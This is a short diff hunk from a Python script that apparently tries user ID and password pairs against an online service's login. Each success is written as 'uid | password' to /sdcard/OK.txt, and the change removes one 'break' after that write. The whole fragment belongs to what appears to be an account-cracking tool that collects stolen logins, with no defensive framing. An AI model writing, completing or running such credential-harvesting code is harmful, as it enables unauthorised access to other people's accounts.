@@ -678,7 +678,6 @@ def freeq(uid,pwx,tl):
                 cek_apk(session,coki)
                 open('/sdcard/OK.txt', 'a').write(uid+' | '+ps+'\n')
                 ok.append(uid)
-                    break
             else:
                 continue
         loop+=1
